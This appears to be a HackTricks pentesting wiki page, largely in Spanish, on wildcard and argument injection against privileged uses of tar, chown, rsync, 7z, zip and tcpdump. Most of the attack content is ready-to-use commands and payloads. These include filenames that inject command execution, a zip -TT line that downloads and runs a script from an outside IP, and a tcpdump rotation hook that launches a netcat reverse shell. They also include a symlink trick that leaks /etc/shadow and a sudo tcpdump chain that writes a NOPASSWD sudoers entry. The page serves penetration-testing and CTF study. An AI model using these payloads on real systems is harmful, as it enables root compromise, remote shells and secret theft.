# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> La **inyección de argumentos** de wildcard (también llamada *glob*) ocurre cuando un script privilegiado ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard sin comillas como `*`.
> Como el shell expande el wildcard **antes** de ejecutar el binario, un atacante que pueda crear archivos en el directorio de trabajo puede fabricar nombres de archivo que empiecen por `-` para que se interpreten como **opciones en lugar de datos**, introduciendo de forma efectiva flags arbitrarios o incluso comandos.
> Esta página recopila las primitivas más útiles, la investigación reciente y las detecciones modernas para 2023-2025.

## chown / chmod

Puedes **copiar el propietario/grupo o los bits de permiso de un archivo arbitrario** abusando del flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Cuando root más tarde ejecuta algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` es inyectado, causando que *todos* los archivos coincidentes hereden la propiedad/permisos de `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Ejecuta comandos arbitrarios abusando de la característica **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una vez que root ejecuta, por ejemplo, `tar -czf /root/backup.tgz *`, `shell.sh` se ejecuta como root.

### bsdtar / macOS 14+

El `tar` por defecto en macOS recientes (basado en `libarchive`) no implementa `--checkpoint`, pero aún puedes lograr ejecución de código con la bandera **--use-compress-program** que te permite especificar un compresor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Cuando un script privilegiado ejecuta `tar -cf backup.tar *`, se iniciará `/bin/sh`.

---

## rsync

`rsync` permite sobrescribir el remote shell o incluso el binario remoto mediante flags de línea de comandos que empiezan con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root más tarde archiva el directorio con `rsync -az * backup:/srv/`, la bandera inyectada abre tu shell en el lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Incluso cuando el script con privilegios antepone *defensivamente* el wildcard con `--` (para detener el análisis de opciones), el formato 7-Zip admite **file list files** anteponiendo el nombre del archivo con `@`.  Combinar eso con un symlink te permite *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root ejecuta algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip intentará leer `root.txt` (→ `/etc/shadow`) como una lista de archivos y abortará, **imprimiendo el contenido en stderr**.

Esto sobrevive a `-- *` porque la CLI de 7-Zip acepta explícitamente tanto nombres de archivo normales como `@listfiles` como entradas posicionales, así que un nombre de archivo literal como `@root.txt` sigue tratándose de forma especial.

---

## zip

Existen dos primitivas muy prácticas cuando una aplicación pasa nombres de archivo controlados por el usuario a `zip` (ya sea mediante un wildcard o enumerando nombres sin `--`).

- RCE vía test hook: `-T` habilita “test archive” y `-TT <cmd>` reemplaza el tester por un programa arbitrario (forma larga: `--unzip-command <cmd>`). Si puedes inyectar nombres de archivo que empiecen por `-`, divide las flags entre nombres de archivo distintos para que el parsing de short-options funcione:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- NO intentes un único nombre de archivo como `'-T -TT <cmd>'` — las opciones cortas se analizan carácter por carácter y fallará. Usa tokens separados como se muestra.
- Si la app elimina las barras de los nombres de archivo, descarga desde un host/IP sin ruta (ruta predeterminada `/index.html`) y guarda localmente con `-O`, luego ejecuta.
- Puedes depurar el parsing con `-sc` (show processed argv) o `-h2` (more help) para entender cómo se consumen tus tokens.

Ejemplo (comportamiento local en zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Si la capa web ecoa `zip` stdout/stderr (común con wrappers ingenuos), flags inyectadas como `--help` o fallos por opciones incorrectas aparecerán en la respuesta HTTP, confirmando command-line injection y ayudando a ajustar el payload.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Los siguientes comandos han sido abusados en CTFs modernos y en entornos reales. El payload siempre se crea como un *filename* dentro de un directorio escribible que luego será procesado con un wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Hunting vulnerable wrappers and jobs

Recent case studies have shown that wildcard/argv injection is no longer just a **cron + tar** problem. The same bug class keeps appearing in:

- web features that "download everything as zip/tar" from attacker-controlled upload directories
- vendor/appliance debug shells that expose a **tcpdump** wrapper with attacker-controlled filename/filter fields
- backup or rotation jobs that call `tar`, `rsync`, `7z`, `zip`, `chown`, or `chmod` on writable directories

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heurísticas rápidas:

- `-- *` es una buena solución para muchas herramientas GNU, pero **no** para `7z`/`7za` porque `@listfiles` se parsean por separado.
- Para `zip`, busca wrappers que enumeren directamente nombres de archivo controlados por el usuario; la división de short-option (`-T` + `-TT <cmd>`) sigue funcionando incluso sin un shell glob.
- Para `tcpdump`, presta especial atención a wrappers que te permitan controlar **nombres de archivo de salida**, **ajustes de rotación** o argumentos de **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE vía inyección de argv en wrappers

Cuando un restricted shell o un wrapper del proveedor construye una línea de comandos de `tcpdump` concatenando campos controlados por el usuario (p. ej., un parámetro de "nombre de archivo") sin un quoting/validación estrictos, puedes colar flags extra de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (limitar el número de archivos) y `-z <cmd>` (comando post-rotación) permite ejecución arbitraria de comandos como el usuario que ejecuta tcpdump (a menudo root en appliances).

Precondiciones:

- Puedes influir en `argv` pasado a `tcpdump` (p. ej., mediante un wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- El wrapper no sanea espacios ni tokens prefijados con `-` en el campo del nombre de archivo.

PoC clásica (ejecuta un reverse shell script desde una ruta escribible):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalles:

- `-G 1 -W 1` fuerza una rotación inmediata después del primer paquete que coincida.
- `-z <cmd>` ejecuta el comando post-rotate una vez por rotación. Muchas compilaciones ejecutan `<cmd> <savefile>`. Si `<cmd>` es un script/intérprete, asegúrate de que el manejo de argumentos coincida con tu payload.

Variantes sin medios extraíbles:

- Si tienes cualquier otro primitive para escribir archivos (por ejemplo, un wrapper de comando separado que permita redirección de salida), deja tu script en una ruta conocida y activa `-z /bin/sh /path/script.sh` o `-z /path/script.sh` según la semántica de la plataforma.
- Algunos wrappers del proveedor rotan hacia ubicaciones controlables por el atacante. Si puedes influir en la ruta rotada (symlink/directory traversal), puedes dirigir `-z` para ejecutar contenido que controlas por completo sin medios externos.

---

## sudoers: tcpdump con wildcards/argumentos adicionales → arbitrary write/read y root

Patrón anti-sudoers muy común:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemas
- El glob `*` y los patrones permisivos solo restringen el primer argumento `-w`. `tcpdump` acepta múltiples opciones `-w`; la última prevalece.
- La regla no fija otras opciones, así que `-Z`, `-r`, `-V`, etc. están permitidas.

Primitivas
- Sobrescribe la ruta de destino con un segundo `-w` (el primero solo satisface sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Traversal de ruta dentro del primer `-w` para escapar del árbol restringido:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forzar la propiedad de salida con `-Z root` (crea archivos propiedad de root en cualquier lugar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Escritura de contenido arbitrario reproduciendo un PCAP elaborado mediante `-r` (p. ej., para añadir una línea de sudoers):

<details>
<summary>Create a PCAP that contains the exact ASCII payload and write it as root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lectura arbitraria de archivos/leak de secretos con `-V <file>` (interpreta una lista de savefiles). Los diagnósticos de error a menudo muestran líneas, filtrando contenido:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referencias

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
